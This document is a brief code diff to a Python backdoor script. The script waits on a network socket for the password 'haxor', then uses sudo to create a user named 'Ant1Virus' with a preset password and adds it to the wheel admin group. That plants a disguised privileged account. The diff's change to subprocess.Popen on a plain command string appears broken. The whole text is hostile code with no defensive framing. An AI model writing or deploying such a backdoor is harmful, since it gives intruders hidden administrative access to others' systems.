@@ -2,7 +2,6 @@
 import sys
 import subprocess
 import socket
-import shlex
 
 CLIENT_IP = sys.argv[1] 
 PORT = int(sys.argv[2])
@@ -21,8 +20,8 @@ while True:
         if pwd == "haxor":
             print("Correct password, waiting for commands")
             conn.send("done".encode())
-            subprocess.run(shlex.split("sudo useradd -p $(openssl passwd -1 password) Ant1Virus"))
-            subprocess.run(shlex.split("sudo usermod -aG wheel Ant1Virus"))
+            subprocess.Popen("sudo useradd -p $(openssl passwd -1 password) Ant1Virus")
+            subprocess.Popen("sudo usermod -aG wheel Ant1Virus")
             conn.close()
         else:
             print("Incorrect password")
